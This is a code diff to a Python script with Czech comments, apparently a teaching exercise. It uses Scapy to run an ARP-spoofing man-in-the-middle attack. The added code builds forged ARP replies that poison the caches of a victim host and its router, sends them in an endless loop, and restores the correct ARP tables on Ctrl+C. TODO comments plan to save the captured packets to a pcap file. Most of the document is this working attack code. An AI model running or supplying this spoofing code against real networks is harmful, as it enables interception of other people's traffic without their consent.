@@ -13,8 +13,11 @@
 # 4. TODO: Funkce save_capture(packet_list, filename="capture.pcap")
 #    - Použít wrpcap() k uložení nasbíraných dat.
 from scapy.all import ARP, send, wrpcap, sr1, sr
+import time
 
 def spoof():
+
+    # Získání ip adresy a mac adresy oběti a routeru
 
     ip_obet = input("Zadejte IP adresu oběti: ")
     ip_router = input("Zadejte IP adresu routeru: ")
@@ -29,3 +32,28 @@ def spoof():
         print(f"Nepodařilo se získat MAC adresu routeru ({ip_router}).")
 
     
+    # Vytvoření falešného ARP paketu pro oběť
+
+    arp_obet = ARP(op=2, psrc=ip_router, pdst=ip_obet, hwdst=mac_obet)
+    arp_router = ARP(op=2, psrc=ip_obet, pdst=ip_router, hwdst=mac_router)
+
+    # Restore tabulek
+    arp_obet_restore = ARP(op=2, psrc=ip_router, hwsrc=mac_router, pdst=ip_obet, hwdst=mac_obet)
+
+    arp_router_restore = ARP(op=2, psrc=ip_obet, hwsrc=mac_obet, pdst=ip_router, hwdst=mac_router)
+
+    # Odeslání ARP paketů
+
+    try: 
+        while True:
+            print(f"Posílám falešné ARP pakety: Ctrl+C pro ukončení.")
+            send(arp_obet, verbose=False)
+            send(arp_router, verbose=False)
+            time.sleep(2)
+    except KeyboardInterrupt:
+        print("Ukončuji útok, vracím síť do normálu...")
+        # Odeslání správných ARP paketů pro obnovení sítě
+        send(arp_obet_restore, verbose=False, count=5)
+        send(arp_router_restore, verbose=False, count=5)  # Poslat vícekrát pro jistotu
+        print("Síť byla obnovena. Program ukončen.")
+        
